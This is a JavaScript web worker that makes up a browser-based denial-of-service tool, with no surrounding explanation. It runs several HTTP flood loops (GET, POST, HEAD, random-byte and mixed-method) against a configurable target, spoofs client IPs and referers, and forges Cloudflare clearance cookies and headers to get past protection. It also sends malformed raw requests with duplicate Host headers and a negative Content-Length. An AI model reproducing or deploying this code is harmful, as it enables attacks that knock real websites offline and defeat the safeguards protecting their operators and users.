let ACTIVE = false, STATS = { sent: 0, failed: 0 };
let PROXIES = [], TARGET = '', CF = null;
const UA = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'];
const REF = ['https://google.com/','https://bing.com/','https://facebook.com/','https://twitter.com/','https://reddit.com/'];
const rand = (a,b) => Math.floor(Math.random()*(b-a+1))+a;
const rstr = (n) => { let s='',c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';for(let i=0;i<n;i++)s+=c[rand(0,61)];return s; };
const rip = () => `${rand(1,223)}.${rand(0,255)}.${rand(0,255)}.${rand(1,254)}`;

function hdr(cfBypass) {
  const h = { 'Accept':'text/html,*/*;q=0.8','Accept-Language':'en-US,en;q=0.9','Accept-Encoding':'gzip, deflate, br','Referer':REF[rand(0,4)],'Connection':'keep-alive','Cache-Control':'no-store','Pragma':'no-cache','DNT':'1','sec-ch-ua':'"Not.A/Brand";v="99"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','Upgrade-Insecure-Requests':'1','User-Agent':UA[rand(0,2)] };
  if(cfBypass&&CF){ h['CF-Connecting-IP']=rip();h['X-Forwarded-For']=rip();h['X-Real-IP']=rip();h['X-Forwarded-Proto']='https';h['CF-Visitor']='{"scheme":"https"}';h['CF-RAY']=CF.ray||rstr(16);h['Cookie']=`__cfduid=${rstr(32)};cf_clearance=${CF.cf_clearance||rstr(40)}`; }
  else { h['Cookie']=`session=${rstr(32)}`; }
  return h;
}

async function fire(url, method='GET', body=null, cf=false) {
  try {
    fetch(url,{method,mode:'no-cors',credentials:'omit',cache:'no-store',headers:hdr(cf),body}).catch(()=>{});
    STATS.sent++;
  } catch { STATS.failed++; }
}

async function httpFlood(){ while(ACTIVE){ fire(`https://${TARGET}/?_${rstr(8)}=${rand(100000,999999)}`,'GET',null,false); } }
async function cfFlood(){ while(ACTIVE){ const p=['/','/api/','/search','/login','/admin']; fire(`https://${TARGET}${p[rand(0,4)]}?_=${rstr(6)}`,'GET',null,true); } }
async function postFlood(){ while(ACTIVE){ const b=new URLSearchParams();for(let i=0;i<10;i++)b.append(rstr(6),rstr(20));fire(`https://${TARGET}/`,'POST',b,false); } }
async function rawFlood(){ while(ACTIVE){ fire(`https://${TARGET}/`,'POST',crypto.getRandomValues(new Uint8Array(rand(256,2048))),false); } }
async function headFlood(){ while(ACTIVE){ fire(`https://${TARGET}/?_${rstr(8)}=${rand(100000,999999)}`,'HEAD',null,false); } }
async function mixFlood(){ const m=['GET','POST','HEAD','OPTIONS','PUT','DELETE']; while(ACTIVE){ fire(`https://${TARGET}/`,m[rand(0,5)],null,rand(0,1)===1); } }
async function ghostFlood(){ const g=['GET / HTTP/1.1\r\n\r\n','GET / HTTP/1.1\r\nHost:'+TARGET+'\r\nHost:evil.com\r\n\r\n','POST / HTTP/1.1\r\nHost:'+TARGET+'\r\nContent-Length:-1\r\n\r\n']; while(ACTIVE){ fire(`https://${TARGET}/`,'POST',g[rand(0,2)],false); } }

const MAP = { 'http-flood':httpFlood,'get-flood':httpFlood,'post-flood':postFlood,'raw-flood':rawFlood,'head-flood':headFlood,'mix-flood':mixFlood,'cf-bypass':cfFlood,'cf-uam':cfFlood,'http-ghost':ghostFlood,'bypass-ttl':httpFlood,'http-bypass':httpFlood,'cf-cookie':cfFlood };

self.onmessage = function(e){
  const {cmd,config}=e.data;
  if(cmd==='init'){ PROXIES=config.proxies||[]; TARGET=config.target||'target-site.com'; CF=config.cfTokens||null; self.postMessage({type:'ready',proxies:PROXIES.length}); }
  if(cmd==='start'){ ACTIVE=true; const m=config.methods||['http-flood']; for(const method of m){ const fn=MAP[method]||httpFlood; for(let i=0;i<(config.threads||50);i++)fn(); } setInterval(()=>self.postMessage({type:'stats',...STATS}),500); }
  if(cmd==='stop'){ ACTIVE=false; self.postMessage({type:'stopped',final:STATS}); }
};
